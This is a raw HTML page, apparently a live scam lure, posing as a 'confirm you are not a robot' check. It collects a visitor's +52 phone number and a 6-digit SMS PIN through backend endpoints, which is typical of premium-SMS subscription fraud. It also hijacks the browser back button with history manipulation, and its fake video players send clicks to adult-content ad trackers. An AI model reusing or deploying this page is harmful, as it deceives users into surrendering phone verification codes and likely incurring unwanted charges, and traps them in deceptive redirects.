<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title class="a1">注意！</title>
        <link rel="stylesheet" type="text/css" href="/public/styles/styles.min.css">
        <link rel="shortcut icon" href="/public/images/action.ico">
        <script>
            function launchpopLink() {
                var redirectUrl = "https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}";
                var mainUrl = "https://ig2kv.bemobtrcks.com/click";
            
                window.location.href = redirectUrl;
                window.open(mainUrl, "_blank");
            }
        </script>  
            
        <script>
            function init() {
            setTimeout(function(){window.scrollTo(0,1)},0);
            }
            window.history.replaceState('https://congratulations-to-you.com/loading.html', '', 'https://congratulations-to-you.com/loading.html');
            window.history.pushState('https://congratulations-to-you.com/bestgames-2025/index.html', '', 'https://congratulations-to-you.com/bestgames-2025/index.html');
            window.addEventListener('popstate', function(e) {
            if(document.URL.indexOf('https://congratulations-to-you.com/loading.html') >= 0){
            document.location.href = document.location;
            }
            });
        </script>
    
</head>
<body>
    <div class="container">
        
        <div class="container-pin"  id="container">
              
            <h3>Confirm that you are not a robot</h3>             
            <br>

            <!-- 隐藏的 发送错误 信息 -->
            <div class="error-message" id="errorMessage" style="display: none;">
                There was an error connecting to the verification service. Please try again later.
            </div>                
            <!-- 隐藏的 发送成功 信息 -->
            <div class="success-message" id="successMessage" style="display: none;">
                Verification code sent successfully!
            </div>               
            <!-- 隐藏的 loading -->
            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                <p>Processing your request...</p>
            </div>
            

            <form id="phoneForm">
                <!-- 1、手机号码输入框 -->
                <div class="form-group">                        
                    <div class="phone-input">
                        <span class="country-code">+52</span>
                        <input type="text" name="msisdn" id="msisdn" placeholder="Eenter your phone number" required 
                               pattern="[0-9]{3} [0-9]{3} [0-9]{3}" title="Please enter 9 digits in the format: xxx xxx xxx">
                    </div>                       
                </div>
                <!-- 2、验证码输入框 + 发送验证码按钮 -->
                <div class="form-group">                   
                    <div class="pin-input-container-pin">
                        <input type="text" name="pin" id="pin" class="pin-input" placeholder="Enter 6-digit PIN" 
                               pattern="[0-9]{6}" title="Please enter 6 digits" maxlength="6" disabled>
                        <button type="submit" class="send-pin-btn" id="sendPinBtn">Send PIN</button>
                    </div>                       
                </div>             
            </form>
            

            <!-- 3、确认验证码按钮 -->
            <button type="click" class="btn" id="verifyBtn" disabled>Verify PIN</button>
        </div>
        
        <!-- 发送验证码及确认验证码JS -->
        <script> 
            // 点击‘发送验证码’按钮流程
            document.getElementById('phoneForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const input = document.getElementById('msisdn');
                const errorDiv = document.getElementById('errorMessage');
                const successDiv = document.getElementById('successMessage');
                const loadingDiv = document.getElementById('loading');
                const pinInput = document.getElementById('pin');
                const sendPinBtn = document.getElementById('sendPinBtn');
                const verifyBtn = document.getElementById('verifyBtn');
                
                // 隐藏 previous messages
                errorDiv.style.display = 'none';
                successDiv.style.display = 'none';
                
                // 简单的客户端验证
                if (!input.value.match(/^\d{3} \d{3} \d{3}$/)) {
                    errorDiv.textContent = 'Please enter a valid phone number in the format: xxx xxx xxx';
                    errorDiv.style.display = 'block';
                    return;
                }
                
                // 显示加载指示器
                loadingDiv.style.display = 'block';
                
                try {
                    // 发送数据到服务器端处理
                    const formData = new FormData();
                    formData.append('msisdn', input.value);
                    
                    const response = await fetch('/api/api_handler.php', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (result.status === 'success') {
                        successDiv.textContent = result.message || 'Verification code sent successfully!';
                        successDiv.style.display = 'block';
                        errorDiv.style.display = 'none';
                        
                        // 启用PIN输入和verify按钮
                        
                        pin.disabled = false;
                        verifyBtn.disabled = false;
                        
                        // 保存tracker（如果有）
                        if (result.tracker) {
                            window.tracker = result.tracker;
                        }
                        // 禁用按钮并开始倒计时
                        sendPinBtn.disabled = true;
                        let countdown = 120; // 120秒倒计时
                        
                        // 更新按钮文本
                        sendPinBtn.textContent = `Resend in ${countdown}s`;
                        
                        // 设置倒计时间隔
                        const countdownInterval = setInterval(() => {
                            countdown--;
                            sendPinBtn.textContent = `Resend in ${countdown}s`;
                            
                            if (countdown <= 0) {
                                clearInterval(countdownInterval);
                                sendPinBtn.disabled = false;
                                sendPinBtn.textContent = 'Send PIN';
                            }
                        }, 1000);
                        
                        
                    } 
                    else {
                        // 显示错误消息
                        errorDiv.textContent = result.message || 'An error occurred. Please try again.';
                        errorDiv.style.display = 'block';
                    }
                }
                catch (error) {
                    // 处理网络错误
                    errorDiv.textContent = 'Network error. Please check your connection and try again.';
                    errorDiv.style.display = 'block';
                    console.error('Error:', error);
                } 
                finally {
                    // 无论成功或失败，都隐藏加载指示器
                    loadingDiv.style.display = 'none';
                }
            });
            
            // 格式化电话号码输入
            document.getElementById('msisdn').addEventListener('input', function(e) {
                // 移除所有非数字字符
                let value = e.target.value.replace(/\D/g, '');
                
                // 如果超过10位，截取前10位
                if (value.length > 9) {
                    value = value.substring(0, 9);
                }
                
                // 根据数字长度进行格式化
                let formattedValue = value;
                if (value.length > 6) {
                    formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 9);
                } else if (value.length > 3) {
                    formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6);
                }
                
                // 更新输入框的值
                e.target.value = formattedValue;
            });
                      
            // 验证PIN码按钮功能
            document.getElementById('verifyBtn').addEventListener('click', async function() {
                const pinInput = document.getElementById('pin');
                const errorDiv = document.getElementById('errorMessage');
                const successDiv = document.getElementById('successMessage');
                const loadingDiv = document.getElementById('loading');
                const containerDiv = document.getElementById('container');
                const player = document.getElementById('player');
                // 验证PIN码
                if (!pinInput.value.match(/^\d{6}$/)) {
                    errorDiv.textContent = 'Please enter a valid 6-digit PIN code';
                    errorDiv.style.display = 'block';
                    return;
                }
                
                // 显示加载指示器
                loadingDiv.style.display = 'block';
                errorDiv.style.display = 'none';
                successDiv.style.display = 'none';
                
                try {
                    // 发送验证请求
                    const formData = new FormData();
                    formData.append('pin', pinInput.value);
                    formData.append('tracker', window.tracker || '');
                    
                    const response = await fetch('/api/verify.php', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    // 如果返回success,重新给successDiv的textContent赋值
                    if (result.status === 'success') {
                        successDiv.textContent = result.message || 'Verification successful!';
                        successDiv.style.display = 'block';
                        
                        // 如果服务器返回了重定向地址，设置一个2秒的延时，然后重定向用户到相应的页面。
                        if (result.redirect) {
                            setTimeout(() => {
                                window.location.href = result.redirect;
                            }, 2000);
                        }
                        // 没重定向将整个div隐藏，显示出下面的播放按钮，方便点击跳转
                        else{
                             
                            setTimeout(() => {
                                containerDiv.classList.add('fade-out');
                                
                                setTimeout(() => {
                                    containerDiv.classList.add('hidden');}, 1000);
                            }, 1000);
                            player.classList.remove('disable-interaction');    
                            
                        }
                    } 
                    else {
                        errorDiv.textContent = result.message || 'Invalid verification code. Please try again.';
                        errorDiv.style.display = 'block';
                    }
                } catch (error) {
                    errorDiv.textContent = 'Verification code is incorrect. Please check your PIN and try again.';
                    errorDiv.style.display = 'block';
                    console.error('Error:', error);
                } finally {
                    loadingDiv.style.display = 'none';
                }
            });
        </script>
       
        
    </div>

    <script>
        // 简单的播放器控制逻辑
        document.addEventListener('DOMContentLoaded', function() {
            const playButtons = document.querySelectorAll('.button');
            
            playButtons.forEach(button => {
                if (button.textContent === '▶') {
                    button.addEventListener('click', function() {
                        const isPlaying = this.textContent === '❚❚';
                        this.textContent = isPlaying ? '▶' : '❚❚';
                    });
                }
            });
        });
    </script>


    <div class="disable-interaction" id="player">
    <!-- 第一行播放器 -->
    <div class="player-row">
        <div class="player-container">
            <div class="player bg1">
                <div class="controls">
                    <button class="button">▶</button>
                    <div class="progress">
                        <div class="progress-filled"></div>
                    </div>
                    <div class="time">0:00 / 39:46</div>
                    <button class="button">🔊</button>
                    <button class="button">⛶</button>
                </div>
                <div class="player_content">
                    <img class="loading2" src="/public/images/loading2.svg" alt="">
                    
                    <img class="play" src="/public/images/play.svg" alt="" onclick="launchpopLink()">
                </div>
            </div>
        </div>
    </div>
    
    <!-- 第二行播放器 -->
    <div class="player-row">
        <div class="player-container">
            <div class="player bg2">
                <div class="controls">
                    <button class="button">▶</button>
                    <div class="progress">
                        <div class="progress-filled"></div>
                    </div>
                    <div class="time">0:00 / 21:36</div>
                    <button class="button">🔊</button>
                    <button class="button">⛶</button>
                </div>
                <div class="player_content">
                    <img class="loading2" src="/public/images/loading2.svg" alt="">
                    
                    <img class="play" src="/public/images/play.svg" alt="" onclick="launchpopLink()">
                </div>
            </div>
        </div>
    </div>
    
    <!-- 第三行播放器 -->
    <div class="player-row">
        <div class="player-row disable-interaction" >
        <div class="player-container">
            <div class="player bg3">
                <div class="controls">
                    <button class="button">▶</button>
                    <div class="progress">
                        <div class="progress-filled"></div>
                    </div>
                    <div class="time">0:00 / 46:17</div>
                    <button class="button">🔊</button>
                    <button class="button">⛶</button>
                </div>
                <div class="player_content">
                    <img class="loading2" src="/public/images/loading2.svg" alt="">
                    
                    <img class="play" src="/public/images/play.svg" alt="" onclick="launchpopLink()">
                </div>
            </div>
        </div>
    </div>
    
    <!-- 第四行播放器 -->
    <div class="player-row">
        <div class="player-row disable-interaction" >
        <div class="player-container">
            <div class="player bg4">
                <div class="controls">
                    <button class="button">▶</button>
                    <div class="progress">
                        <div class="progress-filled"></div>
                    </div>
                    <div class="time">0:00 / 36:25</div>
                    <button class="button">🔊</button>
                    <button class="button">⛶</button>
                </div>
                <div class="player_content">
                    <img class="loading2" src="/public/images/loading2.svg" alt="">
                    
                    <img class="play" src="/public/images/play.svg" alt="" onclick="launchpopLink()">
                </div>
            </div>
        </div>
    </div>
    </div>
</body>
</html>